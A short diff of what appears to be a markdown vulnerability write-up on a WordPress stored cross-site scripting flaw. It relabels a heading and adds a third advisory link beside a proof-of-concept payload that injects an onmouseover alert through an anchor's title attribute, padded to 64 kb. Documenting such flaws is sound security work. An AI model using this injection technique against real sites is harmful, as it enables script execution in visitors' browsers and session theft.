@@ -14,6 +14,7 @@
 
     `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA     [64 kb] ...'></a>`
 
-  - [ ] Affected source code: 
+  - [ ] Sources Used: 
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2.2/src/wp-admin/post.php)
     - [Link 2](http://klikki.fi/adv/wordpress2.html)
+    - [Link 3] (https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html)
